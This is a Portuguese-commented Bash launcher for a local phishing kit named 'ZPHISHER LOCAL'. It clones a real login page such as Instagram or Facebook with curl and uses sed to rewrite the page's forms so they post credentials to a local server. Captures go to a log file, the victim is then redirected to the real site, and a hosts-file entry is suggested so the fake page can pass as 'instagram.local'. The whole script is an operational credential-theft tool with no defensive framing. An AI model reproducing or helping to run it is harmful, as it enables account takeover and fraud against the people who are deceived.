#!/bin/bash

# ============================================
# ZPHISHER LOCAL - Inicializador Rapido
# Uso: bash start.sh <url_para_clonar> <url_redirect>
# Exemplo: bash start.sh https://instagram.com https://instagram.com
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET_URL="${1}"
REDIRECT_URL="${2}"
PORT="${3:-8080}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
SERVER_FILE="$SCRIPT_DIR/server/server.js"

# Verificar argumentos sem argumento
if [ -z "$TARGET_URL" ]; then
    echo -e "${CYAN}"
    echo "�═══════════════════════════════════════════╗"
    echo "║     ZPHISHER LOCAL - Inicializador       ║"
    echo "�═══════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "Uso: ${GREEN}bash start.sh <site_para_clonar> <redirect_para> [porta]${NC}"
    echo ""
    echo -e "Exemplo:"
    echo -e "  ${YELLOW}bash start.sh https://instagram.com https://instagram.com${NC}"
    echo -e "  ${YELLOW}bash start.sh https://facebook.com https://facebook.com 8080${NC}"
    echo ""
    exit 1
fi

if [ -z "$REDIRECT_URL" ]; then
    REDIRECT_URL="$TARGET_URL"
fi

# Instalar node se não tiver
if ! command -v node &> /dev/null; then
    echo -e "${YELLOW}[...] Instalando Node.js...${NC}"
    pkg install nodejs -y
fi

# Limpar e clonar
rm -rf "$SITE_DIR"/*
mkdir -p "$SITE_DIR"

echo -e "${YELLOW}[...] Clonando $TARGET_URL ...${NC}"

# Baizar página
curl -s -L -o "$SITE_DIR/index.html" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko20.0.0.0 Safari/537.36" \
    "$TARGET_URL"

# Modificar formularios para captura
sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"

# Obter IP
IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
if [ -z "$IP" ]; then
    IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
fi

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║            clone realizado              ║${NC}"
echo -e "${CYAN}╠═══════════════════════════════════════════�${NC}"
echo -e "${CYAN}║  Site clonado: ${TARGET_URL}             ║${NC}"
echo -e "${CYAN}║  Redirect:     ${REDIRECT_URL}           ║${NC}"
echo -e "${CYAN}�═══════════════════════════════════════════╣${NC}"
echo -e "${GREEN}"
echo -e "║ 🔥 URL DO SERVIDOR:                      ║"
echo -e "║    http://${IP}:${PORT}                ║"
echo -e "�═══════════════════════════════════════════╝"
echo -e "${YELLOW}║                                           ║${NC}"
echo -e "${YELLOW}║ Para URL customizada no PC:               ║${NC}"
echo -e "${GREEN}║ Edite: C:\\Windows\\System32\\drivers\\etc\\hosts${NC}"
echo -e "${YELLOW}║ Adicione:                                ║${NC}"
echo -e "${GREEN}║    ${IP}  instagram.local             ║${NC}"
echo -e "${YELLOW}║                                           ║${NC}"
echo -e "${GREEN}║ Agora digite no PC: instagram.local     ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════╝"
echo -e "${NC}"
echo ""

# Iniciar servidor
echo -e "${GREEN}[✓] Iniciando servidor...${NC}"
REDIRECT_URL="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
